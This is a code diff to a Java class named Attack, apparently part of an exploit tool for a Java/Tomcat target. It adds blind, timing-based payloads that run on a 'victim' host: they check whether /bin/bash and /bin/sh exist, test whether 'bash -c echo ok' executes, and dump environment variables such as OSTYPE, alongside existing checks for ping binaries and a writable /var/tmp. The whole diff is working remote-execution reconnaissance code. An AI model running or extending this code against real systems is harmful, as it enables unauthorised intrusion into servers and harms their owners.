@@ -132,6 +132,10 @@ public class Attack {
                 AttackTools.payloadCmd("fileEx", "/usr/sbin/ping")));
         final boolean isPing05 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                 AttackTools.payloadCmd("fileEx", "/usr/local/bin/ping")));
+        final boolean isBash = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
+                AttackTools.payloadCmd("fileEx", "/bin/bash")));
+        final boolean isSh = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
+                AttackTools.payloadCmd("fileEx", "/bin/sh")));
 
         // Property read - interesting ones
         log("OS: /bin/ping %s", isPing01);
@@ -139,6 +143,8 @@ public class Attack {
         log("OS: /usr/bin/ping %s", isPing03);
         log("OS: /usr/sbin/ping %s", isPing04);
         log("OS: /usr/local/bin/ping %s", isPing05);
+        log("OS: /bin/bash %s", isBash);
+        log("OS: /bin/sh %s", isSh);
         log(" ");
 
         // Can connect?
@@ -167,6 +173,13 @@ public class Attack {
         final boolean writeVarTmp = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                 AttackTools.payloadCmd("fileCanWrite", "/var/tmp")));
         log("Can write to /var/tmp : %s", writeVarTmp);
+
+        // Can execute /bin/bash?
+        final boolean canExecBash = applyPayloadOnVictim(merge(
+                AttackTools.payloadCmd("bashc", "echo ok"),
+                sleepJson
+        ));
+        log("Can execute /bin/bash -c echo ok : %s", canExecBash);
         log(" ");
 
         //Operating system name
@@ -182,6 +195,7 @@ public class Attack {
         dumpProperty("catalina.config");
         dumpEnvVar("CATALINA_OPTS");
         dumpEnvVar("PATH");
+        dumpEnvVar("OSTYPE");
     }
 
     /**
